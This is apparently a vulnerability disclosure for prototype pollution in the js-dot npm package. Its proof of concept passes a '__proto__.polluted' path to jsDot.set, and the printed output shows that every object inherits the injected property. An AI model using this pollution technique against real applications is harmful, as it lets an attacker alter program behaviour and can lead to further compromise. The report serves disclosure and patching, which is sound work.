# Description

Prototype Pollution in js-dot

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var jsDot = require("js-dot")
var obj = {}
console.log("Before : " + {}.polluted);
jsDot.set(obj,"__proto__.polluted","Yes! Its Polluted");
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i js-dot # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
